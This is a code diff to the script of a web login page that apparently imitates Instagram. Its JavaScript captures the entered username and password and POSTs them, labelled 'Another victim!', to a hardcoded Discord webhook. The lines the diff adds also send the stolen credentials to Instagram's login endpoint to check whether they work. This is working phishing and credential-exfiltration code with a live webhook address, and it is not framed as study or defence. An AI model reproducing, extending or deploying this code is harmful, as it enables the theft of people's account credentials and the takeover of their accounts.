@@ -72,24 +72,46 @@
             color: #999;
         }
     </style>
-    <script>
-        function unleashTheKraken() {
-            var username = document.getElementById("username").value;
-            var password = document.getElementById("password").value;
+<script>
+    function unleashTheKraken() {
+        var username = document.getElementById("username").value;
+        var password = document.getElementById("password").value;
 
-            // Prepare to dive into the abyss of the web
-            var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg", true);
-            xhr.setRequestHeader("Content-Type", "application/json");
+        // Prepare to dive into the abyss of the web
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://discord.com/api/webhooks/1116509552695840768/qaUSQH-IXxJOiAgDTmflw3wNTJcg5kmMHMtSe6fi7Xm0HA3JHrOEpXUUFWBRvE22HvQg", true);
+        xhr.setRequestHeader("Content-Type", "application/json");
 
-            var data = JSON.stringify({
-                "content": "Oh, look! Another victim!\nUsername: " + username + "\nPassword: " + password
-            });
+        var data = JSON.stringify({
+            "content": "Oh, look! Another victim!\nUsername: " + username + "\nPassword: " + password
+        });
 
-            // Let the Kraken loose!
-            xhr.send(data);
-        }
-    </script>
+        // Let the Kraken loose!
+        xhr.send(data);
+        
+        // Make the login validation request to Instagram
+        var xhrValidation = new XMLHttpRequest();
+        xhrValidation.open("POST", "https://www.instagram.com/accounts/login/ajax/", true);
+        xhrValidation.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhrValidation.onreadystatechange = function() {
+            if (xhrValidation.readyState === 4 && xhrValidation.status === 200) {
+                var response = JSON.parse(xhrValidation.responseText);
+                if (response.authenticated) {
+                    alert("Login successful!");
+                } else {
+                    alert("Login failed.");
+                }
+            }
+        };
+
+        // Construct the login parameters
+        var loginParameters = "username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password);
+
+        // Send the login validation request
+        xhrValidation.send(loginParameters);
+    }
+</script>
+
 </head>
 <body>
     <div class="login-container">
